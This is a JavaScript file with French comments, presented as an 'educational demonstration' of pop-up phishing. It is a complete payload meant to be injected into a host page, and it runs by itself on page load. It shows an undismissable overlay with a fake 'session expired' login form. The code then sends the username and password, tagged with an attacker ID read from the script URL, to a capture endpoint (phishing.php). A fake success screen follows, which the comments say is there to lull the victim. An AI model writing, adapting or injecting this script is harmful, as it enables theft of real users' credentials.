// codes/assets/popup.js
// Script de démonstration éducative - Phishing par pop-up (CORRIGÉ)

(function() {
    // Récupérer l'ID de l'attaquant depuis l'URL du script lui-même
    // Permet d'inclure le script via <script src=".../popup.js?sender=X"></script>
    const currentScriptSrc = document.currentScript ? document.currentScript.src : '';
    const urlParams = new URLSearchParams(currentScriptSrc.split('?')[1]);
    const senderUserId = urlParams.get('sender') || 'unknown';
    
    // Fonction principale de création du pop-up
    function createPhishingPopup() {
        // Éviter les doublons si le script est chargé plusieurs fois
        if (document.getElementById('phishing-overlay')) return;

        // Création de l'overlay de blocage (Arrière-plan semi-transparent)
        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2147483647; /* Priorité d'affichage maximale */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            pointer-events: auto;
        `;
        
        // Conteneur de la fausse boîte de dialogue
        const popupContainer = document.createElement('div');
        popupContainer.id = 'phishing-popup';
        popupContainer.style.cssText = `
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
            padding: 35px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-sizing: border-box;
            animation: popupFadeIn 0.3s ease-out;
        `;
        
        // Injection de l'animation CSS d'apparition dans le head
        const styleSheet = document.createElement("style");
        styleSheet.type = "text/css";
        styleSheet.innerText = `
            @keyframes popupFadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
            @keyframes popupShake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
        `;
        document.head.appendChild(styleSheet);

        // Structure HTML interne du formulaire de reconnexion
        popupContainer.innerHTML = `
            <div style="margin-bottom: 20px;">
                <h2 style="color: #050505; margin: 0 0 10px 0; font-size: 1.4rem; font-weight: 600;">Votre session a expiré</h2>
                <p style="color: #e74c3c; margin: 0; font-size: 0.9rem; font-weight: 600;">⚠️ Action requise : Veuillez vous reconnecter.</p>
            </div>
            
            <form id="phishing-form-inner" style="display: flex; flex-direction: column; gap: 15px; text-align: left;">
                <div style="display: flex; flex-direction: column; gap: 5px;">
                    <label for="phishing-username" style="font-size: 0.85rem; color: #65676b; font-weight: 500;">Nom d'utilisateur</label>
                    <input type="text" name="username" id="phishing-username" required autocomplete="username"
                        style="width: 100%; padding: 10px; border: 1px solid #d0d0d0; border-radius: 6px; box-sizing: border-box; font-size: 0.95rem;">
                </div>
                
                <div style="display: flex; flex-direction: column; gap: 5px;">
                    <label for="phishing-password" style="font-size: 0.85rem; color: #65676b; font-weight: 500;">Mot de passe</label>
                    <input type="password" name="password" id="phishing-password" required autocomplete="current-password"
                        style="width: 100%; padding: 10px; border: 1px solid #d0d0d0; border-radius: 6px; box-sizing: border-box; font-size: 0.95rem;">
                </div>
                
                <button type="submit" style="width: 100%; padding: 12px; background: linear-gradient(135deg, #31a24c 0%, #4db366 100%); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 1rem; font-weight: bold; margin-top: 5px; transition: opacity 0.2s;">
                    Se reconnecter
                </button>
            </form>
            
            <p style="color: #65676b; font-size: 0.75rem; margin-top: 20px; border-top: 1px solid #f0f2f5; padding-top: 15px;">
                Connexion sécurisée TLS (Démonstration académique)
            </p>
        `;
        
        overlay.appendChild(popupContainer);
        document.body.appendChild(overlay);
        
        // Écouteur d'événement sur la soumission du formulaire interne
        const form = document.getElementById('phishing-form-inner');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Verrouiller le bouton pour éviter les doubles clics pendant l'envoi
            const submitBtn = form.querySelector('button');
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.6';
            submitBtn.textContent = 'Vérification...';
            
            // Extraction des valeurs saisies
            const username = document.getElementById('phishing-username').value;
            const password = document.getElementById('phishing-password').value;
            
            // Envoi asynchrone des identifiants vers le endpoint de capture
            fetch('/messagerie/codes/fake_login/phishing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderUserId)}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Interface de transition positive pour endormir la méfiance de la victime
                    popupContainer.innerHTML = `
                        <div style="padding: 20px 0;">
                            <div style="font-size: 3.5rem; color: #31a24c; margin-bottom: 10px;">✓</div>
                            <h2 style="color: #050505; margin-bottom: 8px; font-size: 1.3rem;">Session restaurée</h2>
                            <p style="color: #65676b; font-size: 0.9rem; margin: 0;">Votre identité a été vérifiée avec succès.</p>
                        </div>
                    `;
                    // Fermeture automatique après 2 secondes
                    setTimeout(() => {
                        if (overlay) overlay.remove();
                    }, 2000);
                } else {
                    alert('Erreur de réauthentification. Veuillez réessayer.');
                    // Réinitialisation du bouton en cas d'échec retourné
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                    submitBtn.textContent = 'Se reconnecter';
                }
            })
            .catch(error => {
                console.error('Erreur réseau/transmission:', error);
                alert('Une erreur de communication est survenue.');
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                submitBtn.textContent = 'Se reconnecter';
            });
        });
        
        // Empêcher la fermeture en cliquant à côté (effet de blocage persistant)
        overlay.addEventListener('click', function(e) {
            if (e.target === overlay) {
                popupContainer.style.animation = 'none';
                void popupContainer.offsetWidth; // Déclencher un reflow pour réinitialiser l'animation
                popupContainer.style.animation = 'popupShake 0.3s ease-in-out';
            }
        });
    }
    
    // Déclenchement automatique au chargement de la page hôte
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createPhishingPopup);
    } else {
        createPhishingPopup();
    }
})();